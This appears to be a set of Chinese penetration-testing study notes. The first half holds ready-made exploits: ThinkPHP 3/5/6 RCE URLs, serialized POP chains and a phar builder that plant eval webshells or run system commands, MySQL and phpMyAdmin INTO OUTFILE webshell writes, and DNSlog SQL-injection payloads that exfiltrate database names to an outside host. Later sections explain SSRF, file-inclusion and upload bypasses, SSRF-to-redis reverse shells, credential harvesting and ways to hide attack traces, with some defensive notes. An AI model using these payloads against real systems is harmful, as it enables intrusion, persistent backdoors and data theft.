命名空间===>封装到一个特定的作用域中,解决同一个命名空间命名冲突的问题 namespace xxxx\\xxxx\\xxxx; new xxxx\\xxxx\\xxxx\\A();

**exp**

[http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username](http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username "http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username")\[0\]=notin&username\[1\]=(1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%20--%20&username\[2\]=exp

[http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username](http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username "http://www.tp3.com/index.php?/index.php?m=Home&c=Index&a=test2&username")0\=exp&username0\==%201)%20and%20extractvalue(1,%20concat(0x7e,user()))%20--%20

**S参数**

利用S参数可以实现在tp3的Temp目录下生成一个md5值的文件名,并且内容就是传递的第二个参数的值

[http://www.tp3.com/index.php/home/index/test6?bihuo=%0aeval(](http://www.tp3.com/index.php/home/index/test6?bihuo=%0Aeval%28 "http://www.tp3.com/index.php/home/index/test6?bihuo=%0aeval(")$\_GET\[1\]);//

**缓存**

**rce**

[http://www.tp3.com/index.php?m=Home&c=Index&a=index&value](http://www.tp3.com/index.php?m=Home&c=Index&a=index&value "http://www.tp3.com/index.php?m=Home&c=Index&a=index&value")\[\_filename\]=./Application/Runtime/Logs/Home/21\_07\_26.log&1234567=phpinfo();&XDEBUG\_SESSION\_START=PHPSTORM

[www.address.com/index.php/xxxx](http://t.csdn.cn/www.address.com/index.php/xxxx "www.address.com/index.php/xxxx")\[\_filename\]

1.访问这个

[https://www.tp3.com/index.php?m=Home&c=Index&a=index1&value](https://www.tp3.com/index.php?m=Home&c=Index&a=index1&value "https://www.tp3.com/index.php?m=Home&c=Index&a=index1&value")\[\_filename\]=./Application/Runtime/Logs/Home/21\_07\_26.log

## TP5

[http://www.tp5\_0.com/index.php?s=index/](http://t.csdn.cn/index.php?s=index/ "http://www.tp5_0.com/index.php?s=index/")\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=phpinfo&vars1\=1

[http://www.tp5\_0.com/index.php?s=index/](http://t.csdn.cn/index.php?s=index/ "http://www.tp5_0.com/index.php?s=index/")\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=assert&vars1\=eval($\_POST\[1\]);&XDEBUG\_SESSION\_START=PHPSTORM

rce

[http://www.tp5\_0.com/index.php?s=index/](http://t.csdn.cn/index.php?s=index/ "http://www.tp5_0.com/index.php?s=index/")\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=assert&vars1\=eval($\_POST\[1\]);

[http://www.tp5\_0.com/index.php?s=index/](http://t.csdn.cn/index.php?s=index/ "http://www.tp5_0.com/index.php?s=index/")\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=file\_put\_contents&vars1\=./2021\_07\_27.php&vars1\=%3C?php%20eval($\_GET\[1\]);?%3E&XDEBUG\_SESSION\_START=PHPSTORM

5.1

?s=index/\\think\\Request/input&filter\[\]=system&data=whoami

## TP6

**反序列化**

<?php namespace think\\cache{ abstract class Driver{ protected $writeTimes = 0; protected $options = \['expire'=>1, 'hash\_type'=>'md5', 'path'=>'./','cache\_subdir'=>false, 'prefix'=>false, 'data\_compress'=>false\];

} }

namespace think\\cache\\driver{ use think\\cache\\Driver; class File extends Driver {

public function set($name, $value, $expire = null): bool { //$name 完全可控 $value 部分可控 $this->writeTimes++;

if (is\_null($expire)) { $expire = $this->options\['expire'\]; }

$expire = $this->getExpireTime($expire); //使用了$this->getCacheKey($name) $filename = $this->getCacheKey($name);

$dir = dirname($filename);

if (!is\_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } //$value部分可控 $data = $this->serialize($value);

if ($this->options\['data\_compress'\] && function\_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); }

$data = "<?php\\n//" . sprintf('%012d', $expire) . "\\n exit();?>\\n" . $data;

$result = file\_put\_contents($filename, $data);

if ($result) { clearstatcache(); return true; }

return false; }

} }

namespace League\\Flysystem\\Cached\\Storage{ use think\\cache\\Driver\\File; abstract class AbstractCache{ protected $autosave = false; protected $cache = array(); protected $complete = '<?php eval($\_GET\[1\]);?>'; public function \_\_destruct() { if (! $this->autosave) { $this->save(); } } public function cleanContents(array $contents) { $cachedProperties = array\_flip(\[ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', 'md5', \]);

foreach ($contents as $path => $object) { if (is\_array($object)) { $contents\[$path\] = array\_intersect\_key($object, $cachedProperties); } }

return $contents; }

public function getForStorage() { $cleaned = $this->cleanContents($this->cache);

return json\_encode(\[$cleaned, $this->complete\]); }

} class PhpRedis extends AbstractCache{ protected $client; protected $key = '1.php'; protected $expire = null;

public function \_\_construct($client){ $this->client = $client; } public function save() { $contents = $this->getForStorage(); $this->client->set($this->key, $contents);

if ($this->expire !== null) { $this->client->expire($this->key, $this->expire); } } } $file\_obj = new File(); $phpRedis\_obj = new PhpRedis($file\_obj); echo urlencode(serialize($phpRedis\_obj)); }

胡老师[whitehathu@qq.com](mailto:whitehathu@qq.com "whitehathu@qq.com") 9:28:49 <?php namespace think\\cache{ abstract class Driver{ protected $writeTimes = 0; protected $options = \['expire'=>1, 'hash\_type'=>'md5', 'path'=>'./','cache\_subdir'=>false, 'prefix'=>false, 'data\_compress'=>false\];

} }

namespace think\\cache\\driver{ use think\\cache\\Driver; class File extends Driver {

public function set($name, $value, $expire = null): bool { //$name 完全可控 $value 部分可控 $this->writeTimes++;

if (is\_null($expire)) { $expire = $this->options\['expire'\]; }

$expire = $this->getExpireTime($expire); //使用了$this->getCacheKey($name) $filename = $this->getCacheKey($name);

$dir = dirname($filename);

if (!is\_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } //$value部分可控 $data = $this->serialize($value);

if ($this->options\['data\_compress'\] && function\_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); }

$data = "<?php\\n//" . sprintf('%012d', $expire) . "\\n exit();?>\\n" . $data;

$result = file\_put\_contents($filename, $data);

if ($result) { clearstatcache(); return true; }

return false; }

} }

namespace League\\Flysystem\\Cached\\Storage{ use think\\cache\\Driver\\File; abstract class AbstractCache{ protected $autosave = false; protected $cache = array(); protected $complete = '<?php eval($\_GET\[1\]);?>'; public function \_\_destruct() { if (! $this->autosave) { $this->save(); } } public function cleanContents(array $contents) { $cachedProperties = array\_flip(\[ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', 'md5', \]);

foreach ($contents as $path => $object) { if (is\_array($object)) { $contents\[$path\] = array\_intersect\_key($object, $cachedProperties); } }

return $contents; }

public function getForStorage() { $cleaned = $this->cleanContents($this->cache);

return json\_encode(\[$cleaned, $this->complete\]); }

} class PhpRedis extends AbstractCache{ protected $client; protected $key = '1.php'; protected $expire = null;

public function \_\_construct($client){ $this->client = $client; } public function save() { $contents = $this->getForStorage(); $this->client->set($this->key, $contents);

if ($this->expire !== null) { $this->client->expire($this->key, $this->expire); } } } $file\_obj = new File(); $phpRedis\_obj = new PhpRedis($file\_obj); echo urlencode(serialize($phpRedis\_obj)); }

**base64**

input=O%3A40%3A%22League%5CFlysystem%5CCached%5CStorage%5CPhpRedis%22%3A6%3A%7Bs%3A9%3A%22%00%2A%00client%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00writeTimes%22%3Bi%3A0%3Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A6%3A%7Bs%3A6%3A%22expire%22%3Bi%3A1%3Bs%3A9%3A%22hash\_type%22%3Bs%3A3%3A%22md5%22%3Bs%3A4%3A%22path%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D.%2F%22%3Bs%3A12%3A%22cache\_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bb%3A0%3Bs%3A13%3A%22data\_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A5%3A%221.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00cache%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22%00%2A%00complete%22%3Bs%3A32%3A%22PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4%3D%22%3B%7D

## shopxo

版本：TP5.1

效果：无需登录的文件上传+ 任意文件读取(控制文件头部) + phar反序列化

思路：

1.找到可控文件上传点

2.生成对应的phar文件

3.利用phar协议配合文件相关函数访问

**查看版本**

**编写poc**（网络搜索到tp5.1的反序列化poc）

<?php namespace think; use think\\facade\\Cookie; use think\\facade\\Session; class Request { protected $hook = \[\]; protected $config = \[\]; protected $filter; protected $param = \[\]; public function \_\_construct(){ $this->filter = 'system'; $this->param = \['calc.exe'\]; $this->hook = \['visible'=>\[$this,'isAjax'\]\]; $this->config = \['var\_ajax' => ''\]; } } abstract class Model{ protected $append = \[\]; private $data = \[\]; function \_\_construct() { $this->append = \['Th0r' => \['a'\]\]; $this->data = \['Th0r' => new Request()\]; } } namespace think\\model; use think\\Model; use think\\Request; class Pivot extends Model { } namespace think\\process\\pipes; use think\\model\\Pivot; class Pipes{} class Windows extends Pipes { private $files = \[\]; function \_\_construct(){ $this->files = \[new Pivot()\]; } } $o = new Windows(); echo urlencode(serialize($o)); //exit(-1); @unlink("phar1.phar"); $phar = new \\Phar("phar1.phar"); //后缀名必须为phar $phar->startBuffering(); $phar->setStub('gif89a'."<?php \_\_HALT\_COMPILER(); ?>"); //设置stub $phar->setMetadata($o); //将自定义的meta-data存入manifest $phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar->stopBuffering(); ?>

**1.先校验poc是否生效（生效会系统执行计算器）**

1）开启打印

2）访问并生成poc

3）为了测试，在任意一个方法下添加一个反序列化生成点

4）在tp中带上input参数访问生成的poc会系统执行计算器，证明poc生效

**2.生成对应的phar文件**

1）访问poc生成phar.phar，将后缀修改为.jpg为了文件上传

2）在修改头像页面中，上传phar.jpg

4）抓取头像上传的包

**2.找到可控文件上传点**

1）发现在 index.php/index/ueditor/index 下存在文件上传点 ，具体如下

http://www.shopxo.com/index.php/index/ueditor/index?action=uploadfile

2）修改头像上传包的路径和name的值，上传成功

**3.利用phar协议配合文件相关函数访问**

1）复制文件上传的绝对路径

2）将得到路径利用伪协议phar：//修改路径头部，并进行base64编码再进行url编码

3）由于在index/qrcode/download方法中的$params值可控，url可传入

4）最后在tp中带url参数访问，系统执行了计算器，试验成功

## MySQL写WebShell有几种方式，利用条件

答：

一、

> union select 后写入
> 
> lines terminated by 写入
> 
> lines starting by 写入
> 
> fields terminated by 写入
> 
> COLUMNS terminated by 写入

二、

> root权限
> 
> GPC关闭（能使用单引号），magic\_quotes\_gpc=On
> 
> 有绝对路径（读文件可以不用，写文件必须）
> 
> 没有配置–secure-file-priv
> 
> 成功条件：有读写的权限，有create、insert、select的权限

## DNSlog

> （1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。
> 
> （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。
> 
> （3）Mysql 中利用 load\_file() 构造payload
> 
> ‘ and if((select load\_file(concat(‘\\\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)#
> 
> （4）Mssql 下利用 master..xp\_dirtree 构造payload
> 
> DECLARE @host varchar(1024);SELECT @host=(SELECT db\_name())+’.xxx.ceye.io’;EXEC(‘master..xp\_dirtree”\\’+@host+’\\foobar$”‘);

## phpmyadmin写sehll的方法

一、常规导入shell的操作

> 创建数据表导出shell
> 
> CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
> 
> INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (‘<?php @eval($\_POST\[pass\]);?>’);
> 
> SELECT `content` FROM `shadow9` INTO OUTFILE ‘C:\\phpStudy\\WWW\\90sec.php’;
> 
> DROP TABLE IF EXISTS `shadow9`;

二、一句话导出shell：

select '<?php @eval($\_POST\[pass\]);?>' into outfile 'c:/phpstudy/www/90sec.php'; select '<?php @eval($\_POST\[pass\]);?>' into outfile 'c:\\\\phpstudy\\\\www\\\\90sec.php';select '<?php @eval($\_POST\[pass\]);?>' into dumpfile 'c:\\\\phpstudy\\\\www\\\\bypass.php';

三、日志备份获取shell

show global variables like "%genera%"; //查询general\_log配置set global general\_log='on'; //开启general log模式SET global general\_log\_file='D:/phpStudy/WWW/cmd.php'; //设置日志文件保存路径SELECT '<?php phpinfo();?>'; //phpinfo()写入日志文件set global general\_log='off'; //关闭general\_log模式

## SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？

答：

> (1)利用进制转换
> 
> (2)利用DNS解析
> 
> (3)利用句号（127。0。0。1）
> 
> (4)利用\[::\]（http://\[::\]:80/）；
> 
> (5)利用@（[http://example.com@127.0.0.1](http://127.0.0.1/ "http://example.com@127.0.0.1")）；
> 
> (6)利用短地址（[百度短网址](http://dwz.cn/11SMa "百度短网址")）；
> 
> (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）

## 应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件

答：

> (1)任务管理器netstat -anp寻找异常进程PID看端口信息，然后根据端口信息定位到文件，cd /proc/PID （ls -l查看），
> 
> 禁用可疑的服务项。
> 
> (2)windows还可以用wmic分析进程参数
> 
> ps-

## phar协议如何利用

（1）可以Bypass一些waf，绕过上传限制

（2）Phar反序列化，Phar:// 伪协议读取phar文件时，会反序列化meta-data储存

## php伪协议input与post数据包发送有什么区别？

（3） 区别

> 一、 application/x-www-form-urlencoded 或 multipart/form-data时
> 
> php://input 中是原始数据。
> 
> $\_POST 中是关联数组，且没有上传控件的内容。
> 
> 二、enctype=”multipart/form-data” 时
> 
> php://input 是无效的。
> 
> 三、 Content-Type = “text/plain”时
> 
> $\_POST 不能获取post的数据， php://input可以。

## 内网服务器信息收集

（1）手动，用一些小工具（批量看存活）

new user /domain查域、net view看共享、hosts文件内网ip域名映射、wifi记录和密码、浏览器中的密码、敏感文件、各类服务的配置文件中信息、历史命令、ssh私钥、FTP的连接信息、xshell等ssh连接工具的session文件，3389连接历史和被连接历史信息、某些内网api接口未授权访问

（2）扫描器

主机扫描、端口扫描、漏洞扫描、识别内网环境、密码爆破、抓密码

（3）留后门，抓信息

## ssrf怎么用redis写shell

答：

（1）SSRF服务端请求伪造

> 一、对内网扫描，获取 banner
> 
> 二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）
> 
> 三、利用协议读取本地文件
> 
> 四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API

（2）如webligic SSRF漏洞

通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\\r字符串替换成%0d%0a

## 预编译能否100%防sql注入

不能。

一、

$pdo->query('SET NAMES gbk'); $var = "\\xbf\\x27 OR 1=1 /\*"; $query = 'SELECT \* FROM test WHERE name = ? LIMIT 1'; $stmt = $pdo->prepare($query); $stmt->execute(array($var));

类似于宽字节注入

二、

$dbh = new PDO("txf"); $name = $\_GET\['name'\]; $stmt = $dbh->prepare('SELECT \* FROM ' . $name . ' where username = :username'); $stmt->execute( array(':username' => $\_REQUEST\['username'\]) );

参数name是一串数组，PDO不会生效

三、

$stmt = $dbh->prepare('SELECT \* FROM foo ORDER BY :userSuppliedData');

PDO对DDL不生效

## SQL注入构造payload

答：

一、布尔型盲注

(1)mysql :

‘and (length(database()))>10 –+

(2)oracle:

‘ and 1=(select decode(user,’SCOTT’,1,0) from dual) –

二、时间型盲注

and if(ascii(substr((select database()),1,1))>115,1,sleep(5))

三、利用报错回显

(1) extractvalue

and extractvalue(1,concat(0x7e,(select database())))

(2) updatexml

updatexml(1,concat(0x7e,(select @@version),0x7e),1)

## UDF提权原理

答：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd

## 提权方式

答：

windows:

> 1.systminfo ,根据系统补丁提权
> 
> 2.第三方服务提权
> 
> 3.数据库提权
> 
> 。。。

linux:

> 1.利用系统内核漏洞进行提权
> 
> 2.泄漏密码提权
> 
> 3.sudo提权
> 
> 4.SUID提权
> 
> 。。。

## XSS弹窗函数 XSS 绕过策略

答：

一、alert,confirm,prompt三种函数

二、绕过策略

> \\1. 大小写混合
> 
> \\2. 双写
> 
> 3.编码
> 
> \\4. fuzz 低频使用标签 <details/open/ontoggle>
> 
> \\5. fuzz 低频使用函数 ontoggle 等
> 
> 6.<img/src=1>
> 
> 7.%0a或者%0d绕过

## cmd 下载文件

> 1.certutil.exe
> 
> 2.powershell
> 
> 3.bitsadmin
> 
> 4.vbs
> 
> 5.ftp

## SVN/GIT源代码泄露

答：

> （1）在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息
> 
> /.git/config
> 
> （2）使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞
> 
> /.svn/entries

## reverse\_tcp 和 bind\_tcp 的区别

答：

（1）reverse\_tcp

木马会主动连接目标服务器

（2）bind\_tcp

木马会监听本地的端口

## 隐藏攻击痕迹的方法

答：

> 1.跳板
> 
> 2.代理服务器
> 
> 3.Tor
> 
> 4.日志
> 
> 5.清除历史记录
> 
> 6.粉碎文件

## 理解漏洞

讲诉一些近期及有代表性的漏洞

### Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)

该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey

### Apache Tomcat 文件包含漏洞(CVE-2020-1938)

默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)

### Weblogic IIOP反序列化漏洞（CVE-2020-2551）

weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击

### Apache Solr远程代码执行（CVE-2019-12409）

默认配置文件solr.in.sh,在其配置文件中ENABLE\_REMOTE\_JMX\_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMX RMI远程代码执行

### SHIRO-550 反序列化漏洞

shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：

得到rememberMe的cookie值–>Base64解码–>AES解密–>反序列化

AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞

### SHIRO-721反序列化漏洞

不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击

### 泛微Ecology OA SQL注入漏洞

validate.jsp接口的SQL注入，/cpt/manage/validate.jsp

### 泛微ecology OA系统接口存在数据库配置信息泄露

/mobile/dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密

### Confluence本地文件泄露漏洞(CVE-2019-3394)

catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在/WEB-INF下

### Apache Dubbo反序列化漏洞（CVE-2019-17564）

当HTTP remoting 开启的时候，存在反序列化漏洞

漏洞部分：

SQL注入：

结构化查询语句

原理：

web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在传入参数中，恶意插入或添加其他SQL语句，随后将这样参数传入到sql服务器执行，从而获取到敏感信息

条件：

传递给后端的参数时可以控制的

参数内容会被带入到数据库查询

分类：

按数据类型分类：整形注入、字符型注入

按注入语法分类：联合注入、报错注入、布尔型注入、延时注入、堆叠注入

其他类型注入分类：二次注入、宽字节注入、cookie注入、dnslog外带注入等

防御：

对进入数据库的特殊字符（单双引号、尖括号等）进行转换或编码转换

参数化查询，参数化查询是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值，参数化查询下，数据库不会将参数内容视为sql语句的一部分，而是在数据库完成sql语句的编译后，才套用参数

限制数据库权限，避免直接向用户显示数据库错误

布尔型和延时注入的共同点：

没有显示位，耗费大量时间

联合查询的条件：

union 必须由两条或大于两条的select语句组成，每个查询必须包含相同的列数

XSS漏洞：

跨站脚本攻击是指恶意攻击者往web页面里插入恶意script代码，当用户浏览该页面时，嵌入web里面的script代码会被执行，从而达到恶意攻击用户的目的

同源策略：

协议、域名、端口相同才算同源

分类：

反射型XSS：攻击者通过浏览器传入构造好的恶意语句到服务器后，又被目标服务器放射回来，在浏览器中被解析并执行（恶意链接获取用户信息）

存储型XSS：应用对于使用者传入参数过滤不严，让攻击者能够有机会将恶意代码存储到服务器中，而每当有其他用户访问该页面时，存储的数据被调用，便自动触发恶意代码

DOM型XSS：它与反射型xss与存储型xss的区别在于不需要服务器解析响应的直接参与，触发xss靠浏览器的dom解析，可以认为是客户端的事（源码中无法找到拼凑的标签）

防御：

使用 addslashes 转义预定义字符、使用 htmlspecialchars将某些预定义字符转义为HTML实体

CSRF漏洞：

跨站请求伪造

是一种挟制用户在当前已登录的web应用程序上执行非本意的操作的攻击方法

经常配合存储型XSS一起使用

前提条件：

登录信任网站A，并在浏览器中保存相应的cookie

在保存的cookie未失效的情况下，访问了危险网站B

如何挟制用户？

利用浏览器特性，当用户登录某正常网站时，会生成一个对应的cookie，而当用户在没有登出的情况下使用另外的链接再次访问正常网站时，同样是以自身的身份，利用这一特性，可以构造特定的恶意链接，从而达到挟持用户身份的目的。

如何让用户执行非本意的操作？

构造特定的恶意链接，当使用者点击链接时，利用使用者的身份向目标网站发送恶意请求信息

防御：

使用验证码；验证referer；使用token验证

SSRF漏洞：

服务器端请求伪造

是一种由攻击者构造形成由服务器端发起请求的一个安全漏洞，一般来说，SSRF攻击的目标是从外网无法访问的内部系统

概述：

很多web应用都提供了从其他服务器上获取数据的功能，使用用户指定的URL，web应用可以获取图片、下载文件、读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。

服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。

验证：

当判断为服务器端发送请求之后，此处就很有可能存在SSRF漏洞

常见限制：

使用\[::\] 来绕过localhost限制 例如：http://\[::\]:80 >>> [http://127.0.0.1](http://127.0.0.1/ "http://127.0.0.1")

@绕过 例如：[http://www.baidu.com@10.10.10.10](http://10.10.10.10/ "http://www.baidu.com@10.10.10.10") 与 [http://10.10.10.10](http://10.10.10.10/ "http://10.10.10.10") 的请求是相同的

短网址绕过、使用句号代替点

危害：

对外网服务器所在的内网、本地进行端口扫描，获取一些服务banner信息

攻击运行在内网或者本地的应用程序

对内网web应用进行指纹识别，通过访问默认文件实现

攻击内外网的web应用。sql注入、struct2、redis等

利用file协议读取本地文件等

常用的相关函数：

file\_get\_contents

fsockopen

curl\_exec

防御：

报错信息统一，避免攻击者利用报错信息来判断端口状态

黑名单内网ip

文件包含漏洞：

常见函数：

include（）、include\_once（）、require（）、require\_once（）

区别：

include 被包含的文件不存在，程序继续执行

require 被包含的文件不存在，程序停止执行

出现语法错误，都会停止执行

原理：

文件包含漏洞产生的原因是在通过引入文件时，包含的文件名，用户可控，由于传入的文件名没有经过合理的效验，或者效验被绕过

漏洞危害：

配合文件上传漏洞 GetShell

可以执行任意脚本代码（ php://input ) （即使没有文件上传也能执行脚本代码）

网站源码文件以及配置文件泄露（ php://filter/read=convert.base64-encode/resource=bihuo.php ) （及时没有文件上传也能读取）

远程文件包含 GetShell

漏洞分类：

本地文件包含

远程文件包含（条件：配置文件中，allow\_url\_fopen 和 allow\_url\_include 为on时，则支持远程文件包含）

漏洞利用：

本地文件包含：

上传图片马，包含图片马GetShell

读取网站源码以及配置文件

包含日志文件 GetShell

包含 session 文件拿 Shell

伪协议：

**php://filter**

只是读取，只需要开启 allow\_url\_fopen，对 allow\_url\_include 不做限制

将文件中的数据进行base64加密之后再输出：

index.php?file=php://filter/read=convert.base64-encode/resource=bihuo.php

**php://input**

需要开启 allow\_url\_include=on，对 allow\_url\_fopen 不做要求

**data:text/plain**

allow\_url\_fopen 与 allow\_url\_include 都需要开启

用法1：?file=data:text/plain,<?php 执行内容 ?>

用法2：?file=data:text/plain;base64，编码后的PHP代码

注意base64加密之后的代码，不能够有+号，否则会和url中的+编码冲突

**zip://伪协议**

使用zip协议，需要将#编码位%23，所以需要PHP版本>=5.3.0，要是因为版本问题无法进行编码，也可以手动进行修改

用法：?file=zip://\[压缩文件路径+文件名\]#\[压缩文件内的子文件名\]

file=zip://./1.zip%231.txt

file=zip://C:/phpstudy/www/haha/1.zip%231.txt

可以使用绝对路径，也可以使用相对路径

**file://伪协议**

file://可以用来访问本地文件系统，且不受 allow\_url\_fopen 与 allow\_url\_include 的影响

用法：?file=file://文件绝对路径

**phar协议：**

用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php

注意：PHP>=5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改成其他任意格式的文件都可以正常使用。

步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式

%00截断：

需要 magic\_quotes\_gpc = off，PHP小于 5.3.4 有效

路径长度截断：

例如：/etc/passwd././././././././.\[...........\]/././././.

PHP版本小于5.2.8可以成功，linux文件名长于4096，windows需要长于256

预防措施：

使用open\_basedir 配置限制访问在指定的区域

过滤（点）（反斜杠）、禁止服务器远程文件包含、包含的参数值，用户不可控

文件上传漏洞：

上传头像或者其他文档时，通过抓包修改数据包或者其他手段上传一个脚本文件，例如上传包含一句话木马的恶意文件，上传成功便可以使用蚁剑之类的工具去链接这个脚本，从而达到控制网站的目的

常用绕过：

使用0x00绕过服务端目录路径检测，例如：eval.php.jpg 使用 eval.php\_jpg（下划线为0x00），当move\_uploaded\_file碰到0x00时会默认截断后面的内容

.htaccess文件攻击（通过move\_uoloaded\_file函数把自己写的.htaccess文件覆盖掉服务器上的，这样就可以解析定义名单了)例如：当定义好了.htaccess文件可以解析文件名含有‘haha’的文件，此时只要上传的文件名中含有‘haha’，就都可以被当做php文件来解析

（.htaccess攻击的提前，Allow Override All、LoadModule rewrite\_module modules/mod\_rewrite.so、#rewrite 模块为开启状态

文件幻数检测（类似于文件标志位检测）可以通过抓包的方式进行修改

cmd制作图片马：copy /b 1.jpg+2.php = 3.jpg

Ahache解析漏洞

mime.types的文件，记录者Apache认识的后缀

一个名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往PHP的位置开始尝试解析，一直解析到能被正常解析的扩展名为止

iis解析漏洞

iis6.0解析漏洞：如果目录名以.asp、.asa、.cer、.cdx结尾，那么该目录下的所有文件都会被当做asp的格式进行解析

如果文件名含有：.asp；、.asa；、.cer；、.cdx；则都会优先按照asp进行解析

iis7.0/7.5 对php解析时有一个类似于nginx的解析漏洞，对任意文件名只要在url后面追加上字符串 ‘ /任意文件名.php’ ，就会按照php的方式去解析

一种是对于低版本的nginx可以在任意文件名后面添加%00.php进行解析攻击

适用版本：nginx 0.5.\* nginx0.6.\* nginx0.7<=0.7.65 nginx 0.8 <= 0.8.37

条件竞争：

上传的文件还没有完全被删除的情况下，提前去访问，以此达到在服务器中执行脚本文件的效果

总结：

黑名单绕过：

文件名大写小、黑名单列表绕过、特殊文件名绕过、0x00截断绕过、.htaccess文件攻击、Apache解析漏洞、nginx解析漏洞、iis解析漏洞、多文件上传

白名单绕过：

0x00截断绕过、文件包含绕过、iis解析绕过、nginx解析绕过

问答：

造成文件上传的原因？

对于上传的文件校验不严格

如果本地不能上传文件，如何去利用包含漏洞？

可以尝试包含日志文件或者session文件

命令执行漏洞：

应用在调用一些执行系统命令函数时，将用户输入的参数拼接到函数参数中，且没有对传入的参数做较多的过滤，这时就有可能造成命令执行漏洞。

常见函数：

system（）有回显、passthru（）有回显

exec（）回显最后一行，需要使用echo进行输出

shell\_exec（）无回显、\`\`反引号 无回显

popen（$command,$mode) 无回显

proc\_open（）无回显

修复措施：

在disable\_functions 禁用一些危险的函数

对传入的参数使用 escapeshellcmd / escapeshellarg 进行过滤

使用addslashes 进行转义，避免用户直接可控命令执行函数中的参数

代码执行漏洞：

应用在调用一些代码执行函数时，没有对参数进行控制或者过滤，导致用户传入的数据被直接写入到函数的参数中，从而造成代码执行漏洞。

常见函数：

eval（）、assert（）、preg\_replace（）+/e 模式

create\_function（）、array\_map（）

call\_user\_func（）/ call\_user\_func\_array（）

array\_filter（）、usort（）、uasort（）

$_GET\['a'\]($_GET\['b'\])；

如果某函数使用了回调函数参数，那么基本就可能存在代码执行漏洞

XXE漏洞：

外部实体注入

当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。

PHP应用可以将 libxml\_disable\_entity\_loader 设置为true 来禁用外部实体，从而起到防御的作用

业务逻辑漏洞：

常见事项：

密码相关问题：弱口令、暴力破解

验证码安全问题：验证码前端可读、验证码前端可控、验证码前端验证、验证码可重复使用、验证码可爆破

接收端前端可控、重置凭证未效验、任意用户密码修改、越权访问、数据遍历、订单金额修改、短信轰炸

弱类型：

类型转换：

‘ == ’ ；会先进行类型转换，再进行对比

‘ === ’ ；会先比较类型，类型不同直接返回 false

0x、0e在PHP中会被解析为十六进制和科学计数法

in\_array（）没有增加第三个参数，只会进行弱类型比较

strcmp（）当为一个数组与字符串进行比较时，会返回null

